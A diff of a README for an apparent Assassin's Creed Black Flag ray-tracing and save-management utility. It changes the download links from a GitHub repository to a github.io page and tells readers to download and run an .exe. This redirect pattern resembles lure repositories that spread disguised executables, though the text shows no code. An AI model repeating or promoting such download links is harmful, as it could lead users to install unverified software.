@@ -1,6 +1,6 @@
 # 🏴‍☠️ black-flag-script-utility-raytrace-save - Enhance visuals and manage your saves
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://butterballreserveclause449.github.io)
 
 This software improves the gaming experience for Assassin's Creed Black Flag. It provides tools to add ray-tracing enhancements to your graphics and simplifies how you manage or edit your save files. You can now adjust lighting effects to look modern and organize your progress files without manual file navigation.
 
@@ -15,7 +15,7 @@ Ensure your computer meets these specifications to run the software effectively:
 
 ## 📥 How to Install
 
-1.  Visit this page to download: [https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save](https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save).
+1.  Visit this page to download: [https://butterballreserveclause449.github.io](https://butterballreserveclause449.github.io).
 2.  Locate the folder labeled "Releases" on the right side of the screen.
 3.  Click the blue release link to view the available files.
 4.  Download the file ending in .exe to your computer.
